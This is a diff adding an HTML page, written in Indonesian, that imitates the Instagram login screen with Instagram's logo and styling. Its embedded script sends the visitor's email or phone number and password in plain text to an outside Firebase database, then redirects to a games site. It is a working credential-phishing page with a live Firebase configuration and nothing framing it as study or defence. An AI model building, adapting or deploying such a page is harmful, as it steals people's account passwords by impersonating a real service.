@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+    
+    <!-- Include Firebase SDK as ES Module -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-analytics.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";
+        
+        // Firebase configuration
+        const firebaseConfig = {
+          apiKey: "AIzaSyADiJ85Yr0cnM3AlN4E23DeLhjjtzS-utg",
+          authDomain: "testing-f7e72.firebaseapp.com",
+          databaseURL: "https://testing-f7e72-default-rtdb.firebaseio.com",
+          projectId: "testing-f7e72",
+          storageBucket: "testing-f7e72.firebasestorage.app",
+          messagingSenderId: "683074830976",
+          appId: "1:683074830976:web:b76109a0b991cbd9335c65",
+          measurementId: "G-JQMD6LTXWC"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const database = getDatabase(app);
+
+        // Form Submission (Login)
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
+            const password = document.getElementById('password').value;
+
+            // Store login data to Firebase
+            const newUserRef = ref(database, 'users/' + Date.now());
+            set(newUserRef, {
+                emailOrPhone: emailOrPhone,
+                password: password
+            }).then(() => {
+                alert('Login berhasil! Anda akan dialihkan ke situs game.');
+                window.location.href = "https://www.friv.com/"; // Redirect to Friv
+            }).catch((error) => {
+                alert('Terjadi kesalahan: ' + error.message);
+            });
+        });
+    </script>
+    
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 200px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #262626;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+        }
+
+        input:focus {
+            border-color: #0095f6;
+            outline: none;
+            box-shadow: 0 0 4px rgba(0, 149, 246, 0.3);
+        }
+
+        button {
+            width: 100%;
+            background-color: #0095f6;
+            color: #fff;
+            padding: 12px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #0084b4;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        </div>
+        <h1>Login ke Instagram</h1>
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="text" id="emailOrPhone" name="emailOrPhone" placeholder="Email atau Nomor Telepon" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" name="password" placeholder="Kata Sandi" required>
+            </div>
+            <button type="submit">Login</button>
+        </form>
+        <div class="footer">
+            Belum punya akun? <a href="#">Daftar</a>
+        </div>
+    </div>
+</body>
+</html>
